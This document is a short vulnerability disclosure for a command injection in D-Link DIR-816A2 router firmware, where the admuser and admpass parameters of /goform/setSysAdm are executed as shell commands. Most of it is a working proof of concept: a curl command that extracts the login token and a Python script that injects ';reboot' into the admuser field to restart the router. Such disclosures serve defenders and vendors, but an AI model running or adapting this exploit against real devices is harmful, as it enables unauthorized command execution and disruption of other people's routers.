# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Command Injection

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/setSysAdm.    The contents of the admuser and admpass parameters are executed as commands

![](img/2.png#center)

![](img/3.png#center)
## POC

Gets the token ID

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Run poc

```python
import requests

tokenid = ''

url = 'http://192.168.0.1/goform/setSysAdm'

payload = ';reboot'

data = {
    'tokenid': tokenid,
    'admuser': payload
}

r = requests.post(url, data)
hunzi = r.text
print(hunzi)
```

The router will restart
